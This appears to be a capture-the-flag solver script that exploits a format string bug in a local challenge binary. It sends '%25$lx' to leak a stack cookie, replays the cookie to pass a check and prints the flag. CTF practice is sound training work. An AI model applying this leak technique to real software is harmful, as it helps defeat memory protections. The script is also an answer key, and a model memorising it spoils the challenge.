#!/usr/bin/env python3
"""Solver for fmt-key-leak.

The first input line is passed directly to printf() as the format string. The
per-run 64-bit cookie is stored on the stack and appears at printf argument
offset 25 (found by scanning `%N$lx` against the known layout of this binary,
built -O0 -no-pie). We leak it with `%25$lx`, then echo it back as a decimal to
pass the equality check, and reveal() prints the flag.
"""
import os
import re

from pwn import context, process

context.log_level = "error"

HERE = os.path.dirname(os.path.abspath(__file__))
BIN = os.path.join(HERE, "..", "chall")

COOKIE_OFFSET = 25


def main() -> None:
    p = process(BIN)
    p.recvline()  # "say something:"
    p.sendline(f"%{COOKIE_OFFSET}$lx".encode())
    cookie = int(p.recvline().strip(), 16)

    p.recvuntil(b"decimal):")
    p.sendline(str(cookie).encode())
    out = p.recvall(timeout=5)
    p.close()

    m = re.search(rb"NCTF\{[^}]*\}", out)
    assert m, f"no flag in output: {out!r}"
    print(m.group(0).decode())


if __name__ == "__main__":
    main()
